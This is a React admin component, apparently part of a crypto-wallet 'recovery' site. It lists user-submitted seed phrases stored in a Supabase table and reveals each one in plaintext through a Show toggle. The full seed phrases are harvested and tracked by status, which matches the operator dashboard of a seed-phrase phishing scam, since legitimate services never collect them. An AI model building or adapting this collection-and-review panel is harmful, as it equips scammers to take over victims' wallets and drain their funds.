import { useState, useEffect } from 'react';
import { supabase } from '@/lib/supabase';
import { Eye, EyeOff, CheckCircle, XCircle, Clock } from 'lucide-react';

interface Submission {
  id: number;
  wallet_id: string;
  wallet_name: string;
  wallet_address: string;
  seed_phrase: string;
  submission_type: string;
  submitted_at: string;
  status: string;
  notes: string;
}

export function SeedSubmissions() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);
  const [showSeeds, setShowSeeds] = useState<Record<number, boolean>>({});
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);

  useEffect(() => {
    fetchSubmissions();
  }, []);

  const fetchSubmissions = async () => {
    try {
      const { data, error } = await supabase
        .from('seed_submissions')
        .select('*')
        .order('submitted_at', { ascending: false });

      if (error) throw error;
      setSubmissions(data || []);
    } catch (error) {
      console.error('Error fetching submissions:', error);
    } finally {
      setLoading(false);
    }
  };

  const updateStatus = async (id: number, status: string) => {
    try {
      const { error } = await supabase
        .from('seed_submissions')
        .update({ status, notes: `Marked as ${status} by admin` })
        .eq('id', id);

      if (error) throw error;
      fetchSubmissions();
    } catch (error) {
      console.error('Error updating status:', error);
    }
  };

  const toggleShowSeed = (id: number) => {
    setShowSeeds(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'completed':
        return { bg: 'rgba(16,185,129,0.15)', color: '#10b981', icon: <CheckCircle size={12} />, text: 'Completed' };
      case 'reviewed':
        return { bg: 'rgba(59,130,246,0.15)', color: '#3b82f6', icon: <Eye size={12} />, text: 'Reviewed' };
      case 'rejected':
        return { bg: 'rgba(239,68,68,0.15)', color: '#ef4444', icon: <XCircle size={12} />, text: 'Rejected' };
      default:
        return { bg: 'rgba(245,158,11,0.15)', color: '#f59e0b', icon: <Clock size={12} />, text: 'Pending' };
    }
  };

  if (loading) {
    return (
      <div className="flex justify-center py-12">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-semibold text-foreground mb-2">Seed Phrase Submissions</h2>
        <p className="text-sm text-muted-foreground">View and manage wallet recovery requests from users</p>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div className="bg-background border border-border rounded-xl p-4">
          <div className="text-2xl font-bold text-foreground">{submissions.length}</div>
          <div className="text-xs text-muted-foreground">Total Submissions</div>
        </div>
        <div className="bg-background border border-border rounded-xl p-4">
          <div className="text-2xl font-bold text-yellow-500">{submissions.filter(s => s.status === 'pending').length}</div>
          <div className="text-xs text-muted-foreground">Pending Review</div>
        </div>
        <div className="bg-background border border-border rounded-xl p-4">
          <div className="text-2xl font-bold text-green-500">{submissions.filter(s => s.status === 'completed').length}</div>
          <div className="text-xs text-muted-foreground">Completed</div>
        </div>
        <div className="bg-background border border-border rounded-xl p-4">
          <div className="text-2xl font-bold text-blue-500">{submissions.filter(s => s.status === 'reviewed').length}</div>
          <div className="text-xs text-muted-foreground">Reviewed</div>
        </div>
      </div>

      {/* Submissions Grid */}
      <div className="grid grid-cols-1 gap-4">
        {submissions.length === 0 ? (
          <div className="bg-background border border-border rounded-xl p-8 text-center text-muted-foreground">
            No seed phrase submissions yet
          </div>
        ) : (
          submissions.map((sub) => {
            const statusBadge = getStatusBadge(sub.status);
            return (
              <div
                key={sub.id}
                className="bg-background border border-border rounded-xl overflow-hidden hover:shadow-md transition-shadow cursor-pointer"
                onClick={() => setSelectedSubmission(sub)}
              >
                <div className="p-4">
                  {/* Header */}
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center gap-2">
                      <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center">
                        <span className="text-primary font-semibold text-sm">{sub.wallet_name?.charAt(0) || 'W'}</span>
                      </div>
                      <div>
                        <div className="font-semibold text-foreground">{sub.wallet_name}</div>
                        <div className="text-xs text-muted-foreground">{new Date(sub.submitted_at).toLocaleString()}</div>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <span
                        className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium"
                        style={{ background: statusBadge.bg, color: statusBadge.color }}
                      >
                        {statusBadge.icon}
                        {statusBadge.text}
                      </span>
                    </div>
                  </div>

                  {/* Content */}
                  <div className="bg-secondary/30 rounded-lg p-3 mb-3">
                    <div className="text-xs text-muted-foreground mb-1">Submission Type</div>
                    <div className="text-sm font-medium text-foreground">
                      {sub.submission_type === 'address' ? 'Wallet Address / TX Hash' : 'Seed Phrase'}
                    </div>
                  </div>

                  {/* Preview */}
                  <div className="text-sm text-muted-foreground truncate">
                    {sub.submission_type === 'address' 
                      ? sub.wallet_address 
                      : '••••••••••••••••••••••••'}
                  </div>

                  {/* Status Actions */}
                  {sub.status === 'pending' && (
                    <div className="flex gap-2 mt-3 pt-3 border-t border-border">
                      <button
                        onClick={(e) => { e.stopPropagation(); updateStatus(sub.id, 'reviewed'); }}
                        className="flex-1 py-1.5 rounded-lg bg-blue-500/10 text-blue-500 text-xs font-medium hover:bg-blue-500/20 transition-colors"
                      >
                        Mark Reviewed
                      </button>
                      <button
                        onClick={(e) => { e.stopPropagation(); updateStatus(sub.id, 'completed'); }}
                        className="flex-1 py-1.5 rounded-lg bg-green-500/10 text-green-500 text-xs font-medium hover:bg-green-500/20 transition-colors"
                      >
                        Mark Completed
                      </button>
                      <button
                        onClick={(e) => { e.stopPropagation(); updateStatus(sub.id, 'rejected'); }}
                        className="flex-1 py-1.5 rounded-lg bg-red-500/10 text-red-500 text-xs font-medium hover:bg-red-500/20 transition-colors"
                      >
                        Reject
                      </button>
                    </div>
                  )}
                </div>
              </div>
            );
          })
        )}
      </div>

      {/* Detail Modal */}
      {selectedSubmission && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setSelectedSubmission(null)}>
          <div className="bg-background rounded-2xl max-w-md w-full max-h-[80vh] overflow-y-auto border border-border" onClick={(e) => e.stopPropagation()}>
            <div className="sticky top-0 bg-background border-b border-border p-4 flex items-center justify-between">
              <h3 className="text-lg font-semibold text-foreground">Submission Details</h3>
              <button onClick={() => setSelectedSubmission(null)} className="w-8 h-8 rounded-full bg-secondary flex items-center justify-center">×</button>
            </div>
            <div className="p-4 space-y-4">
              <div>
                <div className="text-xs text-muted-foreground mb-1">Wallet</div>
                <div className="text-sm font-medium text-foreground">{selectedSubmission.wallet_name}</div>
              </div>
              <div>
                <div className="text-xs text-muted-foreground mb-1">Submission Type</div>
                <div className="text-sm font-medium text-foreground">
                  {selectedSubmission.submission_type === 'address' ? 'Wallet Address / TX Hash' : 'Seed Phrase'}
                </div>
              </div>
              <div>
                <div className="text-xs text-muted-foreground mb-1">Value</div>
                <div className="text-sm bg-secondary/30 rounded-lg p-3 font-mono break-all">
                  {selectedSubmission.submission_type === 'address' ? (
                    selectedSubmission.wallet_address
                  ) : (
                    <div>
                      <div className="flex justify-end mb-2">
                        <button
                          onClick={() => toggleShowSeed(selectedSubmission.id)}
                          className="text-xs text-primary flex items-center gap-1"
                        >
                          {showSeeds[selectedSubmission.id] ? <EyeOff size={12} /> : <Eye size={12} />}
                          {showSeeds[selectedSubmission.id] ? 'Hide' : 'Show'}
                        </button>
                      </div>
                      {showSeeds[selectedSubmission.id] ? (
                        <div className="whitespace-pre-wrap break-all">{selectedSubmission.seed_phrase}</div>
                      ) : (
                        '••••••••••••••••••••••••••••••••'
                      )}
                    </div>
                  )}
                </div>
              </div>
              <div>
                <div className="text-xs text-muted-foreground mb-1">Submitted</div>
                <div className="text-sm text-foreground">{new Date(selectedSubmission.submitted_at).toLocaleString()}</div>
              </div>
              <div>
                <div className="text-xs text-muted-foreground mb-1">Status</div>
                <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium" style={{ background: getStatusBadge(selectedSubmission.status).bg, color: getStatusBadge(selectedSubmission.status).color }}>
                  {getStatusBadge(selectedSubmission.status).icon}
                  {getStatusBadge(selectedSubmission.status).text}
                </div>
              </div>
              {selectedSubmission.status === 'pending' && (
                <div className="flex gap-2 pt-2">
                  <button onClick={() => { updateStatus(selectedSubmission.id, 'reviewed'); setSelectedSubmission(null); }} className="flex-1 py-2 rounded-lg bg-blue-500/10 text-blue-500 text-sm font-medium">Reviewed</button>
                  <button onClick={() => { updateStatus(selectedSubmission.id, 'completed'); setSelectedSubmission(null); }} className="flex-1 py-2 rounded-lg bg-green-500/10 text-green-500 text-sm font-medium">Complete</button>
                  <button onClick={() => { updateStatus(selectedSubmission.id, 'rejected'); setSelectedSubmission(null); }} className="flex-1 py-2 rounded-lg bg-red-500/10 text-red-500 text-sm font-medium">Reject</button>
                </div>
              )}
              <button onClick={() => setSelectedSubmission(null)} className="w-full py-2 rounded-lg bg-primary text-white font-medium mt-2">Close</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}